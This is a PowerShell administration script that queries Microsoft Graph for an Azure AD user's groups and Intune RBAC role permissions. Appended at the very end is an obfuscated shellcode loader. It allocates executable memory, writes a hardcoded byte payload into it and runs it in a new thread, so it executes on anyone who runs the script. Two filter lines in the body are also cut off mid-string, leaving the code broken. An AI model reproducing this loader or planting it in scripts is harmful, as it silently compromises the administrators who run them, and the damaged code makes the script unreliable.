




function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

$userUpn = New-Object "System.Net.Mail.MailAddress" -ArgumentList $User

$tenant = $userUpn.Host

Write-Host "Checking for AzureAD module..."

    $AadModule = Get-Module -Name "AzureAD" -ListAvailable

    if ($AadModule -eq $null) {

        Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview"
        $AadModule = Get-Module -Name "AzureADPreview" -ListAvailable

    }

    if ($AadModule -eq $null) {
        write-host
        write-host "AzureAD Powershell module not installed..." -f Red
        write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow
        write-host "Script can't continue..." -f Red
        write-host
        exit
    }




    if($AadModule.count -gt 1){

        $Latest_Version = ($AadModule | select version | Sort-Object)[-1]

        $aadModule = $AadModule | ? { $_.version -eq $Latest_Version.version }

            

            if($AadModule.count -gt 1){

            $aadModule = $AadModule | select -Unique

            }

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

    else {

        $adal = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll"
        $adalforms = Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll"

    }

[System.Reflection.Assembly]::LoadFrom($adal) | Out-Null

[System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null

$clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547"

$redirectUri = "urn:ietf:wg:oauth:2.0:oob"

$resourceAppIdURI = "https://graph.microsoft.com"

$authority = "https://login.microsoftonline.com/$Tenant"

    try {

    $authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority

    
    

    $platformParameters = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto"

    $userId = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ($User, "OptionalDisplayableId")

    $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result

        

        if($authResult.AccessToken){

        

        $authHeader = @{
            'Content-Type'='application/json'
            'Authorization'="Bearer " + $authResult.AccessToken
            'ExpiresOn'=$authResult.ExpiresOn
            }

        return $authHeader

        }

        else {

        Write-Host
        Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red
        Write-Host
        break

        }

    }

    catch {

    write-host $_.Exception.Message -f Red
    write-host $_.Exception.ItemName -f Red
    write-host
    break

    }

}



Function Get-AADUser(){



[cmdletbinding()]

param
(
    $userPrincipalName,
    $Property
)


$graphApiVersion = "v1.0"
$User_resource = "users"
    
    try {
        
        if($userPrincipalName -eq "" -or $userPrincipalName -eq $null){
        
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
        
        }

        else {
            
            if($Property -eq "" -or $Property -eq $null){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName"
            Write-Verbose $uri
            Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get

            }

            else {

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($User_resource)/$userPrincipalName/$Property"
            Write-Verbose $uri
            (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

            }

        }
    
    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-AADGroup(){



[cmdletbinding()]

param
(
    $GroupName,
    $id,
    [switch]$Members
)


$graphApiVersion = "v1.0"
$Group_resource = "groups"
    
    try {

        if($id){

        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=id eq '$id'"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

        }
        
        elseif($GroupName -eq "" -or $GroupName -eq $null){
        
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
        
        }

        else {
            
            if(!$Members){

            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"
            (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
            
            }
            
            elseif($Members){
            
            $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)?`$filter=displayname eq '$GroupName'"
            $Group = (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
            
                if($Group){

                $GID = $Group.id

                $Group.displayName
                write-host

                $uri = "https://graph.microsoft.com/$graphApiVersion/$($Group_resource)/$GID/Members"
                (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value

                }

            }
        
        }

    }

    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-RBACRole(){



$graphApiVersion = "Beta"
$Resource = "deviceManagement/roleDefinitions"
    
    try {
    
    $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
    (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).Value
    
    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-RBACRoleDefinition(){



[cmdletbinding()]

param
(
    $id
)

$graphApiVersion = "Beta"
$Resource = "deviceManagement/roleDefinitions('$id')?`$expand=roleassignments"
    
    try {

        if(!$id){

        write-host "No Role ID was passed to the function, provide an ID variable" -f Red
        break

        }
    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get).roleAssignments
    
    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}



Function Get-RBACRoleAssignment(){



[cmdletbinding()]

param
(
    $id
)

$graphApiVersion = "Beta"
$Resource = "deviceManagement/roleAssignments('$id')"
    
    try {

        if(!$id){

        write-host "No Role Assignment ID was passed to the function, provide an ID variable" -f Red
        break

        }
    
        $uri = "https://graph.microsoft.com/$graphApiVersion/$($Resource)"
        (Invoke-RestMethod -Uri $uri -Headers $authToken -Method Get)
    
    }
    
    catch {

    $ex = $_.Exception
    $errorResponse = $ex.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($errorResponse)
    $reader.BaseStream.Position = 0
    $reader.DiscardBufferedData()
    $responseBody = $reader.ReadToEnd();
    Write-Host "Response content:`n$responseBody" -f Red
    Write-Error "Request to $Uri failed with HTTP Status $($ex.Response.StatusCode) $($ex.Response.StatusDescription)"
    write-host
    break

    }

}





write-host


if($global:authToken){

    
    $DateTime = (Get-Date).ToUniversalTime()

    
    $TokenExpires = ($authToken.ExpiresOn.datetime - $DateTime).Minutes

        if($TokenExpires -le 0){

        write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow
        write-host

            

            if($User -eq $null -or $User -eq ""){

            $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
            Write-Host

            }

        $global:authToken = Get-AuthToken -User $User

        }
}



else {

    if($User -eq $null -or $User -eq ""){

    $User = Read-Host -Prompt "Please specify your user principal name for Azure Authentication"
    Write-Host

    }


$global:authToken = Get-AuthToken -User $User

}





write-host
write-host "Please specify the User Principal Name you want to query:" -f Yellow
$UPN = Read-Host

    if($UPN -eq $null -or $UPN -eq ""){

    Write-Host "Valid UPN not specified, script can't continue..." -f Red
    Write-Host
    break

    }

$User = Get-AADUser -userPrincipalName $UPN

$UserID = $User.id
$UserDN = $User.displayName
$UserPN = $User.userPrincipalName

Write-Host
write-host "-------------------------------------------------------------------"
write-host
write-host "Display Name:"$User.displayName
write-host "User ID:"$User.id
write-host "User Principal Name:"$User.userPrincipalName
write-host



$MemberOf = Get-AADUser -userPrincipalName $UPN -Property MemberOf

$DirectoryRole = $MemberOf | ? { $_.'@odata.type' -eq "

    if($DirectoryRole){

    $DirRole = $DirectoryRole.displayName

    write-host "Directory Role:" -f Yellow
    $DirectoryRole.displayName
    write-host

    }

    else {

    write-host "Directory Role:" -f Yellow
    Write-Host "User"
    write-host

    }



$AADGroups = $MemberOf | ? { $_.'@odata.type' -eq "

    if($AADGroups){

    write-host "AAD Group Membership:" -f Yellow
        
        foreach($AADGroup in $AADGroups){
        
        $GroupDN = (Get-AADGroup -id $AADGroup.id).displayName

        $GroupDN

        }

    write-host

    }

    else {

    write-host "AAD Group Membership:" -f Yellow
    write-host "No Group Membership in AAD Groups"
    Write-Host

    }



write-host "-------------------------------------------------------------------"


$RBAC_Roles = Get-RBACRole

$Permissions = @()


foreach($RBAC_Role in $RBAC_Roles){

$RBAC_id = $RBAC_Role.id

$RoleAssignments = Get-RBACRoleDefinition -id $RBAC_id
    
    
    if($RoleAssignments){

        $RoleAssignments | foreach {

        $RBAC_Role_Assignments = $_.id

        $Assignment = Get-RBACRoleAssignment -id $RBAC_Role_Assignments

        $RA_Names = @()

        $Members = $Assignment.members
        $ScopeMembers = $Assignment.scopeMembers

            $Members | foreach {

                if($AADGroups.id -contains $_){

                $RA_Names += (Get-AADGroup -id $_).displayName

                }

            }

            if($RA_Names){

            Write-Host
            write-host "RBAC Role Assigned -" $RBAC_Role.displayName -ForegroundColor Cyan
            $Permissions += $RBAC_Role.permissions.actions
            Write-Host

            write-host "Assignment Display Name:" $Assignment.displayName -ForegroundColor Yellow
            Write-Host

            Write-Host "Assignment - Members:" -f Yellow 
            $RA_Names

            Write-Host
            Write-Host "Assignment - Scope (Groups):" -f Yellow
            
                $ScopeMembers | foreach {

                (Get-AADGroup -id $_).displayName

                }

            Write-Host
            write-host "-------------------------------------------------------------------"

            }

        }

    }

}

if($Permissions){

Write-Host
write-host "Effective Permissions for user:" -ForegroundColor Yellow
$Permissions | select -Unique | sort

}

else {

Write-Host
write-host "User isn't part of any Intune Roles..." -ForegroundColor Yellow

}

Write-Host

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x2e,0x9f,0xc0,0xe4,0xdb,0xd5,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42,0x13,0x83,0xea,0xd2,0x7d,0x35,0x18,0xc2,0x00,0xb6,0xe1,0x12,0x65,0x3e,0x04,0x23,0xa5,0x24,0x4c,0x13,0x15,0x2e,0x00,0x9f,0xde,0x62,0xb1,0x14,0x92,0xaa,0xb6,0x9d,0x19,0x8d,0xf9,0x1e,0x31,0xed,0x98,0x9c,0x48,0x22,0x7b,0x9d,0x82,0x37,0x7a,0xda,0xff,0xba,0x2e,0xb3,0x74,0x68,0xdf,0xb0,0xc1,0xb1,0x54,0x8a,0xc4,0xb1,0x89,0x5a,0xe6,0x90,0x1f,0xd1,0xb1,0x32,0xa1,0x36,0xca,0x7a,0xb9,0x5b,0xf7,0x35,0x32,0xaf,0x83,0xc7,0x92,0xfe,0x6c,0x6b,0xdb,0xcf,0x9e,0x75,0x1b,0xf7,0x40,0x00,0x55,0x04,0xfc,0x13,0xa2,0x77,0xda,0x96,0x31,0xdf,0xa9,0x01,0x9e,0xde,0x7e,0xd7,0x55,0xec,0xcb,0x93,0x32,0xf0,0xca,0x70,0x49,0x0c,0x46,0x77,0x9e,0x85,0x1c,0x5c,0x3a,0xce,0xc7,0xfd,0x1b,0xaa,0xa6,0x02,0x7b,0x15,0x16,0xa7,0xf7,0xbb,0x43,0xda,0x55,0xd3,0xa0,0xd7,0x65,0x23,0xaf,0x60,0x15,0x11,0x70,0xdb,0xb1,0x19,0xf9,0xc5,0x46,0x5e,0xd0,0xb2,0xd9,0xa1,0xdb,0xc2,0xf0,0x65,0x8f,0x92,0x6a,0x4c,0xb0,0x78,0x6b,0x71,0x65,0x14,0x6e,0xe5,0x46,0x41,0x14,0xf8,0x2e,0x90,0xd5,0x1c,0xce,0x1d,0x33,0x70,0x40,0x4e,0xec,0x30,0x30,0x2e,0x5c,0xd8,0x5a,0xa1,0x83,0xf8,0x64,0x6b,0xac,0x92,0x8a,0xc2,0x84,0x0a,0x32,0x4f,0x5e,0xab,0xbb,0x45,0x1a,0xeb,0x30,0x6a,0xda,0xa5,0xb0,0x07,0xc8,0x51,0x31,0x52,0xb2,0xf7,0x4e,0x48,0xd9,0xf7,0xda,0x77,0x48,0xa0,0x72,0x7a,0xad,0x86,0xdc,0x85,0x98,0x9d,0xd5,0x13,0x63,0xc9,0x19,0xf4,0x63,0x09,0x4c,0x9e,0x63,0x61,0x28,0xfa,0x37,0x94,0x37,0xd7,0x2b,0x05,0xa2,0xd8,0x1d,0xfa,0x65,0xb1,0xa3,0x25,0x41,0x1e,0x5b,0x00,0x53,0x62,0x8a,0x6c,0x21,0x8a,0x0e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

